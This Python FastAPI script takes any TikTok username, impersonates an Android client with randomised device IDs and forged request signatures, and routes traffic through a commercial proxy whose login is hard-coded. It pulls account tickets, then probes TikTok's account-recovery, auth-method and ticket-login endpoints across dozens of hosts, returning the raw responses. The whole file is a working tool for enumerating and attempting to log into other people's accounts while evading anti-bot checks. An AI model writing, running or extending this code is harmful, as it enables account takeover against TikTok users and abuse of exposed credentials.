from fastapi import FastAPI
import requests
import time
import random
import secrets
import SignerPy

app = FastAPI()


class TikTokFlow:
    def __init__(self, username):
        self.username = username.strip()
        self.session = requests.Session()

        proxy = "infproxy_checkemail509:NLI8oq4ZQC2fJ3yJDcSv@proxy.infiniteproxies.com:1111"
        self.proxy_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        self.hosts = [
            "api16-core-aion-useast5.us.tiktokv.com","api16-core-apix-quic.tiktokv.com",
            "api16-core-apix.tiktokv.com","api16-core-baseline.tiktokv.com",
            "api16-core-c-alisg.tiktokv.com","api16-core-c-useast1a.tiktokv.com",
            "api16-core-quic.tiktokv.com","api16-core-useast5.us.tiktokv.com",
            "api16-core-useast8.us.tiktokv.com","api16-core-va.tiktokv.com",
            "api16-core-ycru.tiktokv.com","api16-core-zr.tiktokv.com",
            "api16-core.tiktokv.com","api16-core.ttapis.com",
            "api16-normal-aion-useast5.us.tiktokv.com","api16-normal-apix-quic.tiktokv.com",
            "api16-normal-apix.tiktokv.com","api16-normal-baseline.tiktokv.com",
            "api16-normal-c-alisg.tiktokv.com","api16-normal-c-useast1a.tiktokv.com",
            "api16-normal-c-useast1a.musical.ly","api16-normal-no1a.tiktokv.eu",
            "api16-normal-quic.tiktokv.com","api16-normal-useast5.tiktokv.us",
            "api16-normal-useast5.us.tiktokv.com","api16-normal-useast8.us.tiktokv.com",
            "api16-normal-va.tiktokv.com","api16-normal-vpc2-useast5.us.tiktokv.com",
            "api16-normal-zr.tiktokv.com","api16-normal.tiktokv.com",
            "api16-normal.ttapis.com","api19-core-c-alisg.tiktokv.com",
            "api19-core-c-useast1a.tiktokv.com","api19-core-useast5.us.tiktokv.com",
            "api19-core-va.tiktokv.com","api19-core-zr.tiktokv.com",
            "api19-core.tiktokv.com","api19-normal-c-alisg.tiktokv.com",
            "api19-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.tiktokv.com",
            "api19-normal-useast5.us.tiktokv.com","api19-normal-va.tiktokv.com",
            "api19-normal-zr.tiktokv.com","api19-normal.tiktokv.com",
            "api2-19-h2.musical.ly","api2.musical.ly",
            "api21-core-c-alisg.tiktokv.com","api21-core-va.tiktokv.com",
            "api21-core.tiktokv.com","api21-h2-eagle.tiktokv.com",
            "api21-h2.tiktokv.com","api21-normal.tiktokv.com",
            "api21-va.tiktokv.com","api22-core-c-alisg.tiktokv.com",
            "api22-core-c-useast1a.tiktokv.com","api22-core-va.tiktokv.com",
            "api22-core-zr.tiktokv.com","api22-core.tiktokv.com",
            "api22-h2-eagle.tiktokv.com","api22-normal-c-alisg.tiktokv.com",
            "api22-normal-c-useast1a.tiktokv.com","api22-normal-va.tiktokv.com",
            "api22-normal-zr.tiktokv.com","api22-normal.tiktokv.com",
            "api22-va.tiktokv.com","api23-core.tiktokv.com",
            "api23-core-zr.tiktokv.com","api23-normal.tiktokv.com",
            "api23-normal-zr.tiktokv.com","api3-core.tiktokv.com",
            "api3-normal.tiktokv.com","api31-core-alisg.tiktokv.com",
            "api31-core.tiktokv.com","api31-core-zr.tiktokv.com",
            "api31-normal-alisg.tiktokv.com","api31-normal.tiktokv.com",
        ]

        self.base_params = {
            'device_platform': 'android',
            'ssmix': 'a',
            'channel': 'googleplay',
            'aid': '1233',
            'app_name': 'musical_ly',
            'version_code': '370805',
            'version_name': '37.8.5',
            'manifest_version_code': '2023708050',
            'os_version': '10',
            'device_type': f'rk{random.randint(3000,4000)}',
            'device_id': str(random.randint(10**18, 10**19-1)),
            'iid': str(random.randint(10**18, 10**19-1)),
            'openudid': secrets.token_hex(8),
            'timezone_name': 'Asia/Riyadh',
            'carrier_region': 'SA',
            'sys_region': 'SA',
            'region': 'SA',
            'request_tag_from': 'h5',
            'scene': '4',
            'mix_mode': '1'
        }

        self.headers = {
            'User-Agent': f'com.zhiliaoapp.musically/{self.base_params["manifest_version_code"]} (Linux; Android 10)'
        }

    def build_headers(self, params):
        sig = SignerPy.sign(params=params)
        h = self.headers.copy()
        h.update({
            'x-ss-req-ticket': sig.get('x-ss-req-ticket',''),
            'x-ss-stub': sig.get('x-ss-stub',''),
            'x-argus': sig.get('x-argus',''),
            'x-gorgon': sig.get('x-gorgon',''),
            'x-khronos': sig.get('x-khronos',''),
            'x-ladon': sig.get('x-ladon',''),
        })
        return h

    def fresh_params(self):
        p = self.base_params.copy()
        ts = int(time.time())
        p['ts'] = ts
        p['_rticket'] = ts * 1000
        return p

    # =========================
    # LOOKUP (FULL RESPONSE)
    # =========================
    def get_ticket(self):
        for host in self.hosts:
            params = self.fresh_params()
            params["account_param"] = self.username

            try:
                r = self.session.post(
                    f"https://{host}/passport/account_lookup/username/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                data = {
                    "host": host,
                    "status": r.status_code,
                    "headers": dict(r.headers),
                    "text": r.text
                }

                print("\n🔥 LOOKUP:", data)

                j = r.json()
                acc = j.get("data", {}).get("accounts", [])
                if not acc:
                    continue

                acc = acc[0]

                return (
                    acc.get("passport_ticket") or acc.get("not_login_ticket"),
                    acc.get("oauth_login_only", False),
                    data
                )

            except Exception as e:
                continue

        return None, None, None

    # =========================
    def safe(self, ticket):
        results = []

        for host in self.hosts:
            params = self.fresh_params()
            params["not_login_ticket"] = ticket
            params["target"] = "recover_account"

            try:
                r = self.session.get(
                    f"https://{host}/passport/shark/safe_verify/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                res = {
                    "host": host,
                    "status": r.status_code,
                    "text": r.text
                }

                print("[SAFE]", res)
                results.append(res)

                if '"error_code":2029' in r.text:
                    return True, results

            except:
                continue

        return False, results

    # =========================
    def auth(self, ticket):
        results = []

        for host in self.hosts:
            params = self.fresh_params()
            params["not_login_ticket"] = ticket

            try:
                r = self.session.get(
                    f"https://{host}/passport/auth/available_ways/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                res = {
                    "host": host,
                    "status": r.status_code,
                    "text": r.text
                }

                print("[AUTH]", res)
                results.append(res)

                if '"message":"success"' in r.text:
                    return True, results

            except:
                continue

        return False, results

    # =========================
    def login(self, ticket):
        results = []

        for host in self.hosts:
            params = self.fresh_params()
            params["passport_ticket"] = ticket

            try:
                r = self.session.post(
                    f"https://{host}/passport/user/login_by_passport_ticket/",
                    params=params,
                    headers=self.build_headers(params),
                    proxies=self.proxy_dict,
                    timeout=5
                )

                res = {
                    "host": host,
                    "status": r.status_code,
                    "headers": dict(r.headers),
                    "text": r.text
                }

                print("[LOGIN]", res)
                results.append(res)

                if '"error_code":2135' in r.text:
                    return True, results

            except:
                continue

        return False, results

    # =========================
    # FLOW (FULL OUTPUT)
    # =========================
    def run(self):
        ticket, oauth, lookup_raw = self.get_ticket()

        if not ticket:
            return {"error": "no_ticket", "lookup": lookup_raw}

        safe_ok, safe_raw = self.safe(ticket)
        auth_ok, auth_raw = self.auth(ticket)
        login_ok, login_raw = self.login(ticket)

        return {
            "ticket": ticket,
            "oauth": oauth,
            "lookup": lookup_raw,
            "safe": safe_raw,
            "auth": auth_raw,
            "login": login_raw,
        }


@app.get("/check")
def check(username: str):
    flow = TikTokFlow(username)
    return flow.run()
